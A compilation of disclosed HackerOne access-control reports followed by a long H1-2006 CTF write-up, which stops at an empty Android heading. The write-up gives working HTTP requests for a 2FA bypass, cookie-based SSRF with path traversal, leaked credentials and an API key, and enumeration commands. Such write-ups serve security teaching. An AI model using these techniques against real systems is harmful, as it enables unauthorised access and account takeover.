- **Disclosed:** 2020-09-09T20:27:41.009Z
- **CVE(s):** -

**Summary (team):**

Due to incorrectly-implemented access control, partners were able to set the "extended_info" value on their own packages. This in turn enabled other security-impacting issues such as the ability to create externally-grantable and other special package types.

---

### [Add apps to packages 0, 61, 62 with /store/ajaxpackagemerge](https://hackerone.com/reports/972243)

- **Report ID:** `972243`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2020-09-09T20:07:48.914Z
- **CVE(s):** -

**Summary (team):**

The ajaxpackagemerge API incorrectly allowed partners to add their own apps to certain Valve administrative packages. This can be further leveraged to generate CD key ranges for these administrative packages.

The API access control was corrected.

---

### [Members from parent group keep their access level on a subgroup transfer and are invisible](https://hackerone.com/reports/790786)

- **Report ID:** `790786`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitLab
- **Reporter:** @kryword
- **Bounty:** - usd
- **Disclosed:** 2020-09-08T13:44:39.344Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

There's an option that allows to transfer groups from one namespace to another, it doesn't work as intended when transferring subgroups from inside a parent group to another group. Users that were part of the first parent group from where the subgroup has been transfered, keep their permissions and access level on the subgroup, wherever it was transfered and without being explicit members of the subgroup.

Not only that, they don't appear as members. They have access without appearing on the members tab. They also get some sort of access to the new parent group where the subgroup has been transfered, without being members of that new group even when it's private.

### Steps to reproduce

1. Create 2 different private groups (so you can instantly see when you get a 404 no access). GroupA, and GroupB.
2. Invite to some members to GroupA and give them maintainer/owner(for testing high privileges) access.
3. Don't invite anyone except yourself to groupB (this makes testing easier).
4. Create a subgroup in groupA, subgroupA
5. Create a project in subgroupA, project-test.

Now, you'll see that members from groupA have access to both subgroupA and project-test, as they are members of the main group groupA.

6. Transfer subgroupA to groupB.
7. Recheck with a user that's not a member of groupB and you'll see he keeps his permission on the transferred subgroup and it's related projects.
8. Also check the members tab and you'll see they don't appear there, and they have permissions to see and if they where owner/maintainer on the previous main group, they have access to settings and that sort of things.

### Impact

It affects all the transferred subgroups and their projects if those were transferred from a main group to another group. Members from that main group are still ghost members and can still access and modify those groups.

Not sure how much of the users have transferred groups to other groups, but it could be a lot.

### Examples

I've made 2 private projects for the tests, I'm making them public but you'll not be able to see the members directly, as one of the members doesn't even appear on the members tab.

Group1 (Added 2 users as members):
https://gitlab.com/groups/main_group1

Group2 (Only cristian.berner is a member of this group):
https://gitlab.com/groups/main_group2

From Group1 I created and transfered subgroup1 with an inner project called project3 to Group2:
https://gitlab.com/main_group1/subgroup1/project3 (This would redirect to https://gitlab.com/main_group2/subgroup1/project3 as it was transferred there)

Now look at members from subgroup1 and members of project3, there's no @kryword in there, still I have full access with that account there to remove/add members or even delete the project.

I attached two screenshots showing this.

### What is the current *bug* behavior?

Members from parent group are also transferred as ghost members(they're not showing in members menu) when a subgroup with projects is transferred to another group.

### What is the expected *correct* behavior?

Members from parent group should not be transferred or if the intended behaviour is that they also get transfered, they should show up in the members menu.

### Output of checks

This bug happens on GitLab.com

## Impact

Members that have been part of a parent group when a transfer happened, they have the same privileges that they had on those subgroups transferred and if they were owners for that moment, they are still owners and not even showing as members on those transfered subgroups/projects.

---

### [Unauthorized Access and updation of EMAIL settings of other user  at https://app.dropcontact.io/app/sponsorship/ by changing the " email " parameter.](https://hackerone.com/reports/953866)

- **Report ID:** `953866`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Dropcontact
- **Reporter:** @xploiterr
- **Bounty:** - usd
- **Disclosed:** 2020-08-11T10:32:16.358Z
- **CVE(s):** -

**Summary (team):**

When changing email settings with firstpromoter, the email of the account was right in the url, so by changing this parameter, we could change setting of other users.

---

### [Insufficient access control on all BCRM instances leading to the ability to create admin accounts using the API](https://hackerone.com/reports/836081)

- **Report ID:** `836081`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** LY Corporation
- **Reporter:** @j0eii
- **Bounty:** - usd
- **Disclosed:** 2020-08-03T10:48:06.934Z
- **CVE(s):** -

**Summary (team):**

[BCRM](https://bcrm-doc.line.me/) is a service that helps manage and analyze your LINE Official Account, and provide useful insights. 

Due to insufficient access control checks in the /admins API endpoint, it was possible for an attacker to create admin accounts. These accounts are "super"-admin accounts meant for internal use only. The endpoint has to be publicly available in order for customers to invite new users as admins, but due to insufficient checks, it was also possible to create "super"-admin accounts.

After receiving the report, we quickly investigated and made sure no suspicious accounts existed and that there had been no malicious activity. We would like to thank @j0eii for his clear proof of concept and how he demonstration of the potential impact of this issue, without affecting our end users.

---

### [Cross-Site WebSocket Hijacking Lead to Steal XSRF-TOKEN](https://hackerone.com/reports/915541)

- **Report ID:** `915541`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Stripo Inc
- **Reporter:** @0xwise
- **Bounty:** - usd
- **Disclosed:** 2020-07-27T12:54:45.017Z
- **CVE(s):** -

**Summary (team):**

The WebSocket handshake request was vulnerable to CSRF, WebSocket content was contain many sensitive data for the user

**Summary (researcher):**

It was like the [PortSwigger Lab](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) .

---

### [[█████████] Administrative access to Oracle WebLogic Server using default credentials](https://hackerone.com/reports/804548)

- **Report ID:** `804548`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @arm4nd0
- **Bounty:** - usd
- **Disclosed:** 2020-06-25T13:38:06.738Z
- **CVE(s):** -

**Summary (team):**

Hello. I discovered an Oracle WebLogic Server and because of weak credentials managed to login as administrator, which led to complete server takeover.

---

### [[H1-2006] CTF Writeup](https://hackerone.com/reports/895778)

- **Report ID:** `895778`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** h1-ctf
- **Reporter:** @nirvana_msu
- **Bounty:** - usd
- **Disclosed:** 2020-06-19T18:07:46.713Z
- **CVE(s):** -

**Vulnerability Information:**

# H1-2006 CTF Writeup

I am fairly new to CTFs - this is just my second CTF after [H1-415 CTF](https://twitter.com/Hacker0x01/status/1217561343986782209), at which I didn't get far at all. I think the most valuable thing I can do for anyone who comes across this writeup, is to describe exactly what I was thinking at each step along the way, including all my failures and dead ends. I personally always find those parts the most valuable in any bug report or writeup that I read.

---------------------------------------

# TL;DR
**For those impatient, here is a condensed walk-through of the CTF. If you're here after the long writeup, you can safely skip this part.**.

1. Subdomain enumeration yields several subdomains: `app.bountypay.h1ctf.com` (customer portal with username/password login), `staff.bountypay.h1ctf.com` (staff portal with username/password login), `api.bountypay.h1ctf.com`, `software.bountypay.h1ctf.com`(denies access from public IPs).
2. Content discovery on `app.bountypay.h1ctf.com` reveals `/.git/config` which references GitHub repo at [https://github.com/bounty-pay-code/request-logger.git](https://github.com/bounty-pay-code/request-logger.git)
3. Source code in the repo exposes the presence of [`/bp_web_trace.log`](http://app.bountypay.h1ctf.com/bp_web_trace.log) file, which gives us three things:
    *  Log file gives us `username` and `password` for authentication on the customer portal, `app.bountypay.h1ctf.com`. Using these credentials we're presented with 2FA challenge. On every access It gives us a random `challenge` (md5 hash) that we need to guess a valid `challenge_answer` for.
    * Log file also gives us a `challenge_answer` (for the past login attempt), but no `challenge` itself. The solution is that `challenge` is simply an md5 hash of the `challenge_answer`, and there is nothing preventing the re-use of the old challenge, so we compute md5 hash of that `challenge_answer` and use this pair to login.
    * Last thing the log file gives us is the following endpoint: `GET /statements?month=04&year=2020`
4. Authentication cookie is base64-encoded JSON such as `{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}`, where `hash` is the actual session, while `account_id` can be freely tampered with.
5. The `/statements` endpoint above reveals that it makes a server-side request to `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04&year=2020`.  When accessed directly, the API endpoint responds with 401 `["Missing or invalid Token"]`. Observe the same account id value, `F8gHiqSdpK`, within the request path- which is in fact taken from `account_id` of the session cookie and interpolated into request path without any sanitization. By changing `account_id` within our authentication cookie we can thus achieve SSRF via Path Traversal - but for now only on same host.
6. Front page on `api.bountypay.h1ctf.com` reveals an endpoint that allows a redirect: `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API`. It uses a whitelist and does not appear to allow an Open Redirect, but several BountyPay subdomains are whitelisted, including `software.bountypay.h1ctf.com`.
7.  Content discovery on `software.bountypay.h1ctf.com` via SSRF with the aforementioned redirect (which bypasses IP restriction) reveals `/uploads` folder with Directory Listing enabled. The only file within it, [`BountyPay.apk`](http://software.bountypay.h1ctf.com/uploads/BountyPay.apk), can be downloaded directly from a public IP.
8. APK interacts with a Firebase instance and presents a series of screens that eventually lead to obtaining a header name (`X-Token`), a header value (`8e9998ee3137ca9ade8f372739f062c1`) and a host name (`api.bountypay.h1ctf.com`). One way those could be obtained is by decompiling the code and following the designed challenges, which involve sending [deep links](https://developer.android.com/training/app-links/deep-linking) to the app. The data of interest could either be intercepted with a proxy, or retrieved  from `/shared_prefs/user_created.xml` with `adb`. Or alternatively one could also have interacted with Firebase directly, using the credentials that are located in `res/values/strings.xml`.
9. `X-Token: 8e9998ee3137ca9ade8f372739f062c1` allows us to make API calls directly on `api.bountypay.h1ctf.com` without SSRF - including `POST` calls that we could not do before. Content discovery on the `/api` directory reveals `/api/staff` endpoint.
    * `GET` request returns some JSON data for a couple of staff members, which includes `staff_id`field with values like `STF:KE624RQ2T9`.
    * `POST` request returns `["Missing Parameter"]` message. The parameter it wants is `staff_id`, and for the valid staff ids it gives `HTTP/1.1 409 Conflict` with message ` ["Staff Member already has an account"]`. Response code hints at the fact that it could provision the new account if we give it a valid  staff id who's account has not yet been set up - e.g. a new joiner.
10. [BountypayHQ](https://twitter.com/BountypayHQ) Twitter account has a tweet `Today we welcome Sandra to the team!!!`, which is the new joiner we're looking for. We can find [Sandra's](https://twitter.com/SandraA76708114) twitter account among either [following](https://twitter.com/BountypayHQ/following) or [followers](https://twitter.com/BountypayHQ/followers) lists for BountypayHQ, and in her timeline we see [this tweet](https://twitter.com/SandraA76708114/status/1258693001964068864) with a photo featuring her staff access card that shows her Staff ID: `STF:8FJ3KFISL3`.
11. Using this `staff_id` in a `POST` request to `/api/staff` provisions a new account, giving us `username` and `password` to access Staff portal at `staff.bountypay.h1ctf.com`.
12.  After logging in with Sandra's credentials and inspecting available endpoints and JS source code, it becomes apparent that the goal of the next challenge is to upgrade her account to Admin. We can see the endpoint for this in JS code, `/admin/upgrade?username=`, but it can only be done by an admin user. We can "report" any page, which makes admin user visit it, but there is an exception that pages under `/admin` would not be visited. There are two separate vulnerabilities that need to be chained to achieve the desired result.
    * Firstly, the trick is to notice that JS code uses very loose selectors (that are based on class only) to perform several actions: `$(".upgradeToAdmin").click` would issue the request to upgrade the account, and `"#tab4" === document.location.hash && $(".tab4").trigger("click")` allows us to force Admin to do the click on an element with `.tab4` class. Coincidentally, there is a feature to change avatar - which is a string used as a class name. Setting it to `upgradeToAdmin tab4` and reporting that page (`/?template=ticket&ticket_id=3582#tab4`) allows us to force Admin to make the API call.
    * What remains is to make sure the above call is made with the correct username, which is taken from an input with name `username`: `let t = $('input[name="username"]').val();`. There is no such input on the page we're reporting (where we can control the class via avatar), `/?template=ticket&ticket_id=3582#tab4`, but there is one in the login page, `/?template=login?username=sandra.allison`. Since backend is PHP we can force `template` parameter to be an array with both `ticket` and `login` values - and luckily for us, a rather weird backend implementation renders both templates and appends them one after another in the response. We can thus piece it all together in a request such as `/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4` that we "report" to Admin and this concludes the Privilege Escalation step. In response we're given a new session cookie - when logged in with that cookie we can see a new tab with customer account usernames and clear-text passwords, including Mårten's credentials.
13. Back to Customer portal, `app.bountypay.h1ctf.com`, we login with new credentials and use same `challenge`/`challenge_answer`pair as before to bypass login 2FA. We now have access to the transactions that need to be processed, but there is one last challenge - it is protected by another 2FA. The task is to exfiltrate challenge answer (code) from a page rendered in the backend within Headless Chrome, and the only thing we know about that page, is that is takes a stylesheet from a URL that's under our control and likely embeds it in that page. It can indeed be verified that our stylesheet is embedded within a `<link rel="stylesheet">` tag with e.g. Burp Collaborator. Under this setup it's not actually possible to exfiltrate data using [recursive techniques](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) such as asynchronous `@import` loading - because imports within `<link>` (unlike `<style>`) are synchronous, and we only have a single injection point. Thankfully for us, the recursive import is not needed since we discover there are multiple inputs on the page - one for each code character. So the entire code can be exfiltrated directly using a bunch of selectors. With the exfiltrated code we complete 2FA verification and are finally presented with the Flag. That is the end of the CTF.

---------------------------------------

# Long Writeup

For those more patient, as promised in the beginning, here is a long writeup where I attempt to describe my process of thinking, including all failed attempts and dead ends.

As usual, the challenge starts with a [tweet](https://twitter.com/Hacker0x01/status/1266454022124376064):
{F861473}

## Reconnaissance

Looking at the `Scope` section of the CTF [Policy] (https://hackerone.com/h1-ctf?view_policy=true) page, we notice that the domain scope is a wildcard `*.bountypay.h1ctf.com`. An obvious first thing to do is thus to kick off a subdomain enumeration (and frankly one should do this anyway).

My go-to tool for subdomain enumeration from passive data sources is [Amass](https://github.com/OWASP/Amass). Although you should ideally set it up with all API keys to various data sources, a simple passive enumeration can be done with just:
```bash
$ amass enum --passive -d bountypay.h1ctf.com
```

> I recommend Amass only for passive enumeration. For bruteforcing you'd be better off using [Massdns](https://github.com/blechschmidt/massdns) with a carefully curated list of resolvers. For the reasons why, I highly recommend the excellent post [Subdomain Enumeration: 2019 Workflow](https://0xpatrik.com/subdomain-enumeration-2019/) by [Patrik Hudak](https://twitter.com/0xpatrik) - in fact his entire blog is worth a careful read. 

This enumeration yielded several subdomains:

```plain
app.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
api.bountypay.h1ctf.com
www.bountypay.h1ctf.com
software.bountypay.h1ctf.com
```
Following my normal bug hunting routine I then tried to brute-force for more subdomains using [Massdns](https://github.com/blechschmidt/massdns)  with [commonspeak2](https://github.com/assetnote/commonspeak2-wordlists/blob/master/subdomains/subdomains.txt) wordlist, as well as using alterations on existing names with [dnsgen](https://github.com/ProjectAnte/dnsgen), but this did not yield any new results.

Next, I kicked off content discovery on each subdomain. In this instance I've simply used Burp (`Engagement tools`->`Discover content`), though I can also highly recommend using [ffuf](https://github.com/ffuf/ffuf) for this with a good wordlist.

While this was running, I manually reviewed each subdomain - HTML and JS code. First observations:
 * `app` and `staff` subdomains require username/password authentication. I've tried a few naive things (like empty password, admin:admin etc) but nothing worked.
 * `software` subdomain appears to restrict access from public IPs: `You do not have permission to access this server from your IP Address`. Simple things like adding `X-Forwarded-For` or `X-Client-IP`pointing to localhost or other private addresses did not change anything. It is likely that we're going to need to find SSRF to interact with it.
 * `api` subdomain has an interesting redirect in its home page: `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API`. Changing target host to something else, like `example.com`, returns `URL NOT FOUND IN WHITELIST`. My first thought was that the whitelist check could be flawed and it could be vulnerable to an Open Redirect (which might prove useful later, such as e.g. for SSRF) but no trick I could think of worked and it seemed pretty secure (I even tried CRLF injection, also no luck). So if it's a whitelist - then what else could be whitelisted? The obvious thing to try were the other subdomains - and it turns out `software` and `staff` are indeed whitelisted. For now let's just take a note of it, as it might be useful for SSRF - especially to access `software` subdomain which is otherwise restricted by IP.

Checking the content discovery results, I've found the first lead - exposed `/.git/` folder on the `app` subdomain, referencing a GitHub repository:

> Note: In all HTTP requests/responses within this writeup, only the most relevant headers are shown for brevity.

```http
GET /.git/config HTTP/1.1
Host: app.bountypay.h1ctf.com
```

```http
HTTP/1.1 200 OK

[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

It was slightly weird that nearly all other files that are normally present were not there. but that's just part of the CTF. Nevertheless I did try to exfiltrate the content of the repo with [gitdumper.sh](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh):
```bash
$ ./gitdumper.sh https://app.bountypay.h1ctf.com/.git/ ./output/
```
but that didn't yield anything new.

Ok, so all we need from this is the GitHub repo itself.  I've checked this repo (including commit history) and the parent organization, but the only valuable piece of information was [logger.php](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php) file:
```php
<?php

$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
```

My first thought was the access `/logger.php` endpoint, but that didn't exist. I then tried accessing `/bp_web_trace.log` and that worked!

```http
GET /bp_web_trace.log HTTP/1.1
Host: app.bountypay.h1ctf.com
```

```http
HTTP/1.1 200 OK

1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

I also tried checking both `/logger.php` and `/bp_web_trace.log`on the other subdomains, just in case similar code was deployed there as well, but that didn't work.

Decoding the base64-encoded log entries gives us:

```json
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

Ok, so we have a username and password (and also something called `challenge_answer`).

## Login 2FA Bypass

When we try to login using these credentials, we're presented with a 2FA challenge:

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com

username=brian.oliver&password=V7h0inzX
```

```html
<form method="post" action="/">
	<input type="hidden" name="username" value="brian.oliver">
	<input type="hidden" name="password" value="V7h0inzX">
	<input type="hidden" name="challenge" value="8de5d288e39ef1beaa3833100a14aa47">
	<div class="panel panel-default" style="margin-top:50px">
		<div class="panel-heading">Login</div>
		<div class="panel-body">
			<div style="margin-top:7px"><label>For Security we've sent a 10 character password to your mobile phone, please enter it below</label></div>
			<div style="margin-top:7px"><label>Password contains characters between A-Z , a-z and 0-9</label></div>
			<div><input name="challenge_answer" class="form-control"></div>
		</div>
	</div>
	<input type="submit" class="btn btn-success pull-right" value="Login">
</form>
```

So we have a `challenge` parameter that looks like an MD5 hash (unique for every new request) that we need to find the valid `challenge_answer` for. Recall that we saw `challenge_answer` from Brian's authentication already in the log. Odd part there was that the log contained `challenge_answer` and not `challenge` - but that must have been done on purpose. It most likely means that the `challenge` and `challenge_answer` could be re-used, so `challenge` was removed it would otherwise be too easy. So maybe instead of trying to find `challenge_answer` for the new `challenge` hash that we're given, we should find `challenge` for that `challenge_answer` submitted by Brian?

So it's clearly an MD5 hash of something. It is also unique on each page reload, so there must be something unique about the string being hashed. That rules out the most obvious things like `username` etc. If it was really sufficiently random then we could never break it, so let's stay positive and assume that it's a unique thing - but something that we actually know. The only such thing that we have is actually the `challenge_answer` itself! I can't say this part of the CTF was "obvious" (and it did take me half an hour or so), but it was still a very logical conclusion if you carefully think it through.

And indeed, taking MD5 hash of `bD83Jk27dQ` and submitting that as the `challenge`bypasses the 2FA:
```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded

username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
```

```http
HTTP/1.1 302 Found
Set-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Mon, 29-Jun-2020 23:36:42 GMT; Max-Age=2592000
Location: /
```

## SSRF

First thing we notice is that the session cookie is base64-encoded JSON. When decoded, it is:
```
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

It's very interesting and unusual to see a parameter like `account_id` here, so let's take note of that.

Another piece of information we have now is the javascript file [app.js](https://app.bountypay.h1ctf.com/js/app.js). It references the following endpoint: `<a href="/pay/' + s.id + "/" + s.hash`, but upon trying to access something like `/pay/1/1` we get `page not found!` response. It clearly needs some valid `id` and `hash` values that we do not have at this stage. Judging from the code, it looks like that endpoint could be used to make the payment to hackers, which is the storyline of this CTF, so it'll likely be needed towards the end of the CTF. 

The only other endpoint we can access, is the one that fetches statements:
```http
GET /statements?month=04&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=04&year=2020","data":"{\"description\":\"Transactions for 2020-04\",\"transactions\":[]}"}
```

Just in case, I've tried to check a range of other year/month combinations (using `Cluster bomb`Attack type within Burp's Intruder) but none returned any valid transactions.

Looking at the response, it is clear the endpoint performs a server-side request to retrieve the data (and it also must have a valid token to authenticate with `api` subdomain). Somewhat unusually, it even shows us the full URL! This smells a lot like SSRF. First thing I've tried was fiddling with `month` and `year` parameters but it didn't yield anything interesting (and even if it did, it wouldn't be of much value as they are in query string, so we couldn't even do path traversal with that). What else can we control within this API request? It must be the account id that we saw in our session cookie before.. there's simply nothing else.

And indeed  that worked. Let's try e.g. adding a `#` after the value: `{"account_id":"F8gHiqSdpK#","hash":"de235bffd23df6995ad4e0930baac1a2"}` (base64-encode it and use it as the cookie):

```http
GET /statements?month=05&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK#\/statements?month=05&year=2020","data":"{\"account_id\":\"F8gHiqSdpK\",\"owner\":\"Mr Brian Oliver\",\"company\":\"BountyPay Demo \"}"}
```

We even found another endpoint and got some data back for Brian, but it doesn't seem to be particularly useful. Recall now that we have a `software` subdomain which looked like an obvious target for SSRF. But we can only do Path Traversal so far. This is where we clearly need to chain Path Traversal with a redirect to access `software` subdomain. Our payload (decoded session cookie) thus becomes: `{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}`

```http
GET /statements?month=05&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=
```

This presents us with a login panel. Extracting HTML from JSON response and prettifying it gives us:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Software Storage</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>

<div class="container">
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <h1 style="text-align: center">Software Storage</h1>
            <form method="post" action="/">
                <div class="panel panel-default" style="margin-top:50px">
                    <div class="panel-heading">Login</div>
                    <div class="panel-body">
                        <div style="margin-top:7px"><label>Username:</label></div>
                        <div><input name="username" class="form-control"></div>
                        <div style="margin-top:7px"><label>Password:</label></div>
                        <div><input name="password" type="password" class="form-control"></div>
                    </div>
                </div>
                <input type="submit" class="btn btn-success pull-right" value="Login">
            </form>
        </div>
    </div>
</div>
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
</body>
</html>
```

There isn't much we can do with it since SSRF only allows us to do `GET` requests and not `POST`. What else? As usual, content discovery.  This one is a little bit more tricky to setup since the payload is base64-encoded, but it can still be easily done in Burp. We need to set the whole session cookie value as the target,  and add 3 `Payload Processing` rules:
1. "Add prefix" with value `{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/`
2. "Add suffix" with value `#","hash":"de235bffd23df6995ad4e0930baac1a2"}`      (the part between them will be our actual payload for content discovery)
3.  "Encode" -> "Base64-encode"
{F861592}

I've used a fairly simple wordlist and got a hit pretty quickly - there is an `/uploads` endpoint with Directory Listing enabled. In hindsight, that could have been guessed pretty easily even without bruteforcing.

```http
GET /statements?month=05&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==
```
HTML code extracted from JSON response is:
```html
<html>
<head><title>Index of /uploads/</title></head>
<body bgcolor="white">
<h1>Index of /uploads/</h1><hr><pre><a href="../">../</a>
<a href="/uploads/BountyPay.apk">BountyPay.apk</a>                                        20-Apr-2020 11:26              4043701
</pre><hr></body>
</html>
```

Not sure why, but I then tried to access APK via SSRF. It didn't work - which is consistent with the behaviour I observed for this SSRF where responses with certain content-types  were not forwarded back to us. I then tried to access the APK [directly](http://software.bountypay.h1ctf.com/uploads/BountyPay.apk), and sure enough it worked.

## Android

While one could start by grepping strings from an APK, I usually go straight to decompiling the Java code. For this I use [dex2jar](https://github.com/pxb1988/dex2jar)  with a command like:
```bash
$ ./d2j-dex2jar.sh -f -o ./../h1-ctf/jar/BountyPay.jar ./../h1-ctf/BountyPay.apk
```
It produces a JAR file which you can then open in [JD-GUI](http://java-decompiler.github.io/). While you can browse the source code directly in JD-GUI, I much prefer JetBrains IDEs. You can export all decompiled code via "Save all sources" menu option, unzip the archive and use in in e.g. [IntelliJ IDEA](https://www.jetbrains.com/idea/).

I then read all relevant parts of the source code (there isn't much, if you ignore all the standard android stuff) and it was fairly clear that the app interacts with a Firebase database and attempts to get your through 3 stages, at the end of which you should have some values for Header, Token and Host from that database.

Credentials to access Firebase could be found in `res/values/strings.xml`:
```xml
<string name="firebase_database_url">https://bountypay-90f64.firebaseio.com</string>
<string name="gcm_defaultSenderId">467982724703</string>
<string name="google_api_key">AIzaSyAyr601_-ElsasDnhGORBykg0ZTDaOxFeo</string>
<string name="google_app_id">1:467982724703:android:4428e053082d32ce84b5ea</string>
<string name="google_crash_reporting_api_key">AIzaSyAyr601_-ElsasDnhGORBykg0ZTDaOxFeo</string>
<string name="google_storage_bucket">bountypay-90f64.appspot.com</string>
```
I quickly checked for some common misconfigurations, such as whether Firebase was publicly readable by accessing https://bountypay-90f64.firebaseio.com/.json, but it seemed that access controls were properly configured.

I knew I then had two routes - either to understand the code well enough to talk to a database directly and extract the needed data (and maybe write a small script for it) or to try and follow through the app exactly as it was designed. Former would have probably been quicker, but the latter seemed more interesting - so I went ahead and installed APK on an emulator.

There are different technologies you could use here. I'm not an expert in Android, but given how generally awesome IntelliJ platform is, the obvious choice for me was to use [Android Studio](https://developer.android.com/studio/).

Running emulator is fairly straight-forward, and is described in these guides:
 * https://developer.android.com/studio/run/emulator
 * https://developer.android.com/studio/run/managing-avds

The steps I've taken to set up my environment were as follows:

1. Open Android Studio, select "debug APK" and point to APK file.
2. Install Android SDK, if not already
3. Create new device within AVD and start it

I've also set up traffic proxying through Burp:
1. Configure proxy in the Emulator's settings as described [here](https://developer.android.com/studio/run/emulator-networking).
2. Install Burp's CA certificate on the device. You can follow Burp guide [here](https://portswigger.net/support/installing-burp-suites-ca-certificate-in-an-android-device) but I find it easier to push the certificate to device's SD card using `adb` (as opposed to sending it via email):

```bash
$ adb push cacert.cer /mnt/sdcard
```

### Android | PartOneActivity

